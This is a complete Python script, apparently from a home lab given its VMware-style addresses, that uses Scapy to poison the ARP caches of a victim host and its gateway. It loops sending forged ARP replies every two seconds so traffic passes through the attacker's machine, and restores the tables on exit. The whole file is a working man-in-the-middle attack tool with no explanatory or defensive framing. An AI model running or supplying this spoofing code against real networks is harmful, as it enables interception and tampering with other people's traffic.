from scapy.all import *
import time

def spoof_victim():
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = "192.168.74.129"
    arp_response.hwdst = "00:0C:29:BE:47:14"
    arp_response.hwsrc = "00:0c:29:90:79:02"

    arp_response.psrc = "192.168.74.2"
    send(arp_response)

def spoof_router():
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = "192.168.74.2"
    arp_response.hwdst = "00:50:56:ff:74:8b"
    arp_response.hwsrc = "00:0c:29:90:79:02"

    arp_response.psrc = "192.168.74.129"
    send(arp_response)


def restore():

    # restoring router table
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = "192.168.74.2"
    arp_response.hwdst = "00:50:56:ff:74:8b"
    arp_response.hwsrc = "00:0C:29:BE:47:14"
    arp_response.psrc = "192.168.74.129"
    send(arp_response)


    #restoring windows table
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = "192.168.74.129"
    arp_response.hwdst = "00:0C:29:BE:47:14"
    arp_response.hwsrc = "00:50:56:ff:74:8b"
    arp_response.psrc = "192.168.74.2"
    send(arp_response)




if __name__ == "__main__":
    try:
        while True:
            spoof_victim()
            spoof_router()
            time.sleep(2)
    except KeyboardInterrupt as err:
        print("restoring ARP")
        restore()
        print("exiting") 
